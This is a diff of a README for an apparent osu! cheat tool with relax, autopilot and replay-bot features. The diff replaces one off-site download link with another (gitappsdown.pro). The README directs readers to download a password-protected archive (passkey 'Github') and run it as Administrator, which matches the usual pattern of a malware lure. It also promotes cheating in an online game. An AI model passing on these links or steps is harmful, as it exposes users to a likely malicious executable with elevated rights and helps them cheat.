@@ -6,7 +6,7 @@ External menu for osu! with relax, autopilot, spinner bot, replay bot, skin unlo
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitappsdown.pro/)**
 
 Archive passkey: `Github`
 
@@ -71,7 +71,7 @@ Based on community tools like **Nirto**, **Kurikku**, and **osu! Trainer**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitappsdown.pro/)** to download.
 2. Extract the archive.
 3. Launch osu!.
 4. Run the tool **as Administrator**.
